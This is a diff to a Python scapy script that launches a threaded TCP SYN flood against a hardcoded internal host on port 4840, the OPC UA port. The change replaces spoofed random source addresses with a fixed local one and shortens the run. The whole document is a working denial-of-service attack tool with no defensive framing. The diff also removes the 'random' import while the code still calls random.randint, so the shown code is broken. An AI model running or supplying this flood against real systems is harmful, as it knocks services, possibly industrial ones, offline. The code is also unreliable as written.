@@ -1,4 +1,3 @@
-import random
 import threading
 import time
 from scapy.all import IP, TCP, send
@@ -6,14 +5,12 @@ from scapy.all import IP, TCP, send
 attack_flag = True
 packet_count = 0
 
-def syn_flood(target_ip, target_port):
+def syn_flood(target_ip, target_port, source_ip):
     global packet_count, attack_flag
     while attack_flag:
         try:
-            # 随机源IP
-            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
-            # 构造 IP 层
-            ip_layer = IP(src=src_ip, dst=target_ip)
+            # 使用固定的源 IP
+            ip_layer = IP(src=source_ip, dst=target_ip)
             # 构造 TCP SYN 层
             tcp_layer = TCP(
                 sport=random.randint(1024, 65535),
@@ -27,18 +24,18 @@ def syn_flood(target_ip, target_port):
         except Exception as e:
             pass
 
-def start_syn_flood(target_ip, target_port, thread_count=1000, attack_time=20):
+def start_syn_flood(target_ip, target_port, source_ip, thread_count=1000, attack_time=20):
     global attack_flag
     attack_flag = True
 
     threads = []
     for i in range(thread_count):
-        t = threading.Thread(target=syn_flood, args=(target_ip, target_port))
+        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, source_ip))
         t.daemon = True
         t.start()
         threads.append(t)
 
-    print(f"Started SYN Flood on {target_ip}:{target_port} with {thread_count} threads.")
+    print(f"Started SYN Flood on {target_ip}:{target_port} from source IP {source_ip} with {thread_count} threads.")
     time.sleep(attack_time)
     attack_flag = False
 
@@ -50,4 +47,5 @@ def start_syn_flood(target_ip, target_port, thread_count=1000, attack_time=20):
 if __name__ == "__main__":
     target_ip = "10.4.3.95"
     target_port = 4840
-    start_syn_flood(target_ip, target_port, thread_count=2000, attack_time=3000)
+    source_ip = "10.5.0.94"  # 使用本机 IP
+    start_syn_flood(target_ip, target_port, source_ip, thread_count=2000, attack_time=30)
